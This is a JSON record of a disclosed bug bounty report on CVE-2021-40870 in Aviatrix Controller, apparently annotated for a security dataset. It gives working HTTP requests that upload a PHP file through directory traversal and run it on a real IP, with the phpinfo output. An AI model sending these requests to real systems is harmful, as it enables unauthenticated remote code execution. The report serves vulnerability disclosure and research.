{
  "reported_to": "Elastic",
  "reported_by": "fdeleite ",
  "title": "CVE-2021-40870 on [52.204.160.31]",
  "content": "\nAn issue was discovered in Aviatrix Controller 6.x before 6.5-1804.1922. Unrestricted upload of a file with a dangerous type is possible, which allows an unauthenticated user to execute arbitrary code via directory traversal.\nThe IP has a SSL certificate pointing to ElasticSearch.\ncurl -kv https://52.204.160.31\nOutput\nCode 111 Bytes\n1 Server certificate:\n2*  subject: C=US; ST=California; L=Mountain View; O=Elasticsearch, Inc.; CN=*.elasticit.co\nSteps To Reproduce\nFirst, run this request:\nCode 414 Bytes\n1POST /v1/backend1 HTTP/1.1\n2Host: 52.204.160.31\n3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\n4Connection: close\n5Content-Length: 136\n6Content-Type: application/x-www-form-urlencoded\n7Accept-Encoding: gzip\n8\n9CID=x&action=set_metric_gw_selections&account_name=/../../../var/www/php/1yv4QQmkj4h4OdmmyT11tkiGf5M.php&data=RCE<?php phpinfo()?>\n10\nThe retrieve the content from file 1yv4QQmkj4h4OdmmyT11tkiGf5M.php\nCode 270 Bytes\n1GET /v1/1yv4QQmkj4h4OdmmyT11tkiGf5M.php HTTP/1.1\n2Host: 52.204.160.31\n3User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36\n4Connection: close\n5Content-Type: application/x-www-form-urlencoded\n6Accept-Encoding: gzip\nWhich is basically the output of the phpinfo function:\nResponse (truncated):\nCode 3.10 KiB\n1tr class=\"h\"><th>Variable</th><th>Value</th></tr>\n2<tr><td class=\"e\">SCRIPT_URL </td><td class=\"v\">/v1/1yv4QQmkj4h4OdmmyT11tkiGf5M.php </td></tr>\n3<tr><td class=\"e\">SCRIPT_URI </td><td class=\"v\">https://52.204.160.31:8443/v1/1yv4QQmkj4h4OdmmyT11tkiGf5M.php </td></tr>\n4<tr><td class=\"e\">HTTPS </td><td class=\"v\">on </td></tr>\n5<tr><td class=\"e\">SSL_SERVER_S_DN_C </td><td class=\"v\">US </td></tr>\n6<tr><td class=\"e\">SSL_SERVER_S_DN_ST </td><td class=\"v\">California </td></tr>\n7<tr><td class=\"e\">SSL_SERVER_S_DN_L </td><td class=\"v\">Mountain View </td></tr>\n8<tr><td class=\"e\">SSL_SERVER_S_DN_O </td><td class=\"v\">Elasticsearch, Inc. </td></tr>\n9<tr><td class=\"e\">SSL_SERVER_S_DN_CN </td><td class=\"v\">*.elasticit.co </td></tr>\n10<tr><td class=\"e\">SSL_SERVER_I_DN_C </td><td class=\"v\">US </td></tr>\n11<tr><td class=\"e\">SSL_SERVER_I_DN_O </td><td class=\"v\">DigiCert Inc </td></tr>\n12<tr><td class=\"e\">SSL_SERVER_I_DN_CN </td><td class=\"v\">DigiCert SHA2 Secure Server CA </td></tr>\n13<tr><td class=\"e\">SSL_SERVER_SAN_DNS_0 </td><td class=\"v\">*.elasticit.co </td></tr>\n14<tr><td class=\"e\">SSL_SERVER_SAN_DNS_1 </td><td class=\"v\">elasticit.co </td></tr>\n15<tr><td class=\"e\">SSL_VERSION_INTERFACE </td><td class=\"v\">mod_ssl/2.4.39 </td></tr>\n16<tr><td class=\"e\">SSL_VERSION_LIBRARY </td><td class=\"v\">OpenSSL/1.1.1b </td></tr>\n17<tr><td class=\"e\">SSL_PROTOCOL </td><td class=\"v\">TLSv1.2 </td></tr>\n18<tr><td class=\"e\">SSL_SECURE_RENEG </td><td class=\"v\">true </td></tr>\n19<tr><td class=\"e\">SSL_COMPRESS_METHOD </td><td class=\"v\">NULL </td></tr>\n20<tr><td class=\"e\">SSL_CIPHER </td><td class=\"v\">ECDHE-RSA-AES128-GCM-SHA256 </td></tr>\n21<tr><td class=\"e\">SSL_CIPHER_EXPORT </td><td class=\"v\">false </td></tr>\n22<tr><td class=\"e\">SSL_CIPHER_USEKEYSIZE </td><td class=\"v\">128 </td></tr>\n23<tr><td class=\"e\">SSL_CIPHER_ALGKEYSIZE </td><td class=\"v\">128 </td></tr>\n24<tr><td class=\"e\">SSL_CLIENT_VERIFY </td><td class=\"v\">NONE </td></tr>\n25<tr><td class=\"e\">SSL_SERVER_M_VERSION </td><td class=\"v\">3 </td></tr>\n26<tr><td class=\"e\">SSL_SERVER_M_SERIAL </td><td class=\"v\">093CE89EF93EE5F18D1E07099ACC5AF9 </td></tr>\n27<tr><td class=\"e\">SSL_SERVER_V_START </td><td class=\"v\">Mar 20 00:00:00 2020 GMT </td></tr>\n28<tr><td class=\"e\">SSL_SERVER_V_END </td><td class=\"v\">Mar 25 12:00:00 2022 GMT </td></tr>\n29<tr><td class=\"e\">SSL_SERVER_S_DN </td><td class=\"v\">CN=*.elasticit.co,O=Elasticsearch\\, Inc.,L=Mountain View,ST=California,C=US </td></tr>\n30<tr><td class=\"e\">SSL_SERVER_I_DN </td><td class=\"v\">CN=DigiCert SHA2 Secure Server CA,O=DigiCert Inc,C=US </td></tr>\n31<tr><td class=\"e\">SSL_SERVER_A_KEY </td><td class=\"v\">rsaEncryption </td></tr>\n32<tr><td class=\"e\">SSL_SERVER_A_SIG </td><td class=\"v\">sha256WithRSAEncryption </td></tr>\n33<tr><td class=\"e\">SSL_SESSION_ID </td><td class=\"v\">9cf6b4b42df9e371982120b49d57f9112c19df3722fb87d15cc592f73e1fa406 </td></tr>\n34<tr><td class=\"e\">SSL_SESSION_RESUMED </td><td class=\"v\">Initial </td></tr>\n35<tr><td class=\"e\">HTTP_HOST </td><td class=\"v\">52.204.160.31 </td></tr>\n36<tr><td class=\"e\">HTTP_USER_AGENT </td><td class=\"v\">Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36 </td></tr>\n37<tr><td class=\"e\">HTTP_CONNECTION </td><td class=\"v\">close </td></tr>\nImpact\nAn unauthenticated, 3rd-party attacker or adversary can execute remote code\nSupporting Material/References\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40870\n\n",
  "severity": [
    9.8,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1633550760,
  "report_url": "https://hackerone.com/reports/1356845",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Send a POST request to /v1/backend1 with a crafted payload that includes directory traversal in the account_name parameter to upload a PHP file containing arbitrary code."
    ],
    [
      2,
      "Retrieve the uploaded PHP file via a GET request to execute the arbitrary code and confirm RCE by observing the phpinfo() output."
    ]
  ],
  "vuln_description": "An unrestricted file upload vulnerability in Aviatrix Controller 6.x allows unauthenticated attackers to upload arbitrary files (including PHP scripts) via directory traversal, leading to remote code execution.",
  "reason": "The vulnerability involves a straightforward exploitation of an unrestricted file upload flaw combined with directory traversal, which are well-known attack vectors. The steps to reproduce are simple and do not require complex interactions or state manipulation.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves an unauthenticated file upload leading to arbitrary code execution via directory traversal. The methodology described focuses on authentication and authorization bypasses within the same application context by swapping user sessions or resource IDs. However, this specific vulnerability does not involve user sessions or resource IDs within the same application context; it exploits a file upload flaw in the Aviatrix Controller. Therefore, it does not fit the described methodologies for detecting IDOR or AuthN/AuthZ bypasses.",
    "is_detectable": false
  }
}